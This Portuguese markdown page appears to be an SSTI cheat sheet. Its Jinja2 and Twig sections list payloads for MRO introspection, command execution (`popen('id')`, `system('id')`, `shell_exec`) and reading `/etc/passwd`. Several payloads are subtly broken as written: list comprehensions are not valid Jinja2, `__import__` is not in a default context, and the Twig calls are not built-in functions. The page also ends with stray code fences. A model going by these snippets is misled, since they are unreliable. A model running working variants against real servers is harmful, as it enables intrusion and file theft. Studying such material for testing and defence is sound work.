````
---
title: Server-Side Template Injection (SSTI)
---
### 1. Template Engines e Funcionamento Interno
{{< tabs items="Visão Geral, Jinja2, Twig" >}}
{{< tab >}}
#### **Visão Geral**
SSTI ocorre quando dados do usuário são interpretados como parte do template no servidor.
Isso permite avaliar expressões internas e acessar objetos sensíveis.
A expressão `{{7*7}}` é usada para confirmar execução.
{{< /tab >}}
{{< tab >}}
#### **Jinja2**
Engine Python que expõe atributos internos dos objetos.
A introspecção permite navegar pela MRO e alcançar funções sensíveis.
A exploração pode resultar em leitura de arquivos e RCE.
**Acesso à MRO**
```jinja
{{ ''.__class__.__mro__ }}
````

**Listar subclasses**

```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

**Buscar classes de execução**

```jinja
{{ [c for c in ''.__class__.__mro__[1].__subclasses__() if 'Popen' in str(c)] }}
```

**RCE**

```jinja
{{ __import__('os').popen('id').read() }}
```

**Leitura de arquivo**

```jinja
{{ app.open_resource('/etc/passwd').read() }}
```

{{< /tab >}}
{{< tab >}}

#### **Twig**

Engine PHP onde implementações fracas expõem funções críticas.
Funções e filtros inseguros permitem execução de comandos.
Includes sem restrição permitem leitura arbitrária de arquivos.

**Execução direta**

```twig
{{ system('id') }}
```

**Execução via filtro**

```twig
{{ 'id'|system }}
```

**Leitura de arquivo**

```twig
{{ include('/etc/passwd') }}
```

**Wrappers expostos**

```twig
{{ shell_exec('id') }}
{{ exec('id') }}
```

{{< /tab >}}
{{< /tabs >}}

```
```
